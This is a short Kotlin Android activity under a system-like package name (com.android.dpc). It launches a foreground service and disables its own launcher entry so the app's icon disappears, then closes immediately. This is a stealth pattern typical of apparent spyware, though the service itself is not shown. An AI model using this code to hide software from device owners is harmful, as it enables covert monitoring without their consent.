package com.android.dpc

import android.app.Activity
import android.content.ComponentName
import android.content.Intent
import android.os.Bundle

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Inicia serviço principal
        val serviceIntent = Intent(this, CoreService::class.java)
        startForegroundService(serviceIntent)
        
        // Remove ícone do launcher
        hideFromLauncher()
        
        // Finaliza activity imediatamente
        finish()
    }
    
    private fun hideFromLauncher() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }
}